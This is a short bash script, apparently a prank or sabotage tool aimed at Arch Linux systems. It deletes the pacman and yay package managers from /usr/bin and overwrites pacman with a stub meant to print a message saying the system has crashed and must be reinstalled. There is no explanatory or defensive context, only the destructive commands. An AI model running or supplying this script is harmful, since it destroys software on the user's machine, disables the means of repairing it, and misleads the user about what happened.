#!/usr/bin/bash
rm /usr/bin/pacman
rm /usr/bin/yay
touch /usr/bin/pacman
echo '#!/usr/bin/bash;echo Your System Has Been Crashed!Try to REINSTALL' > /usr/bin/pacman
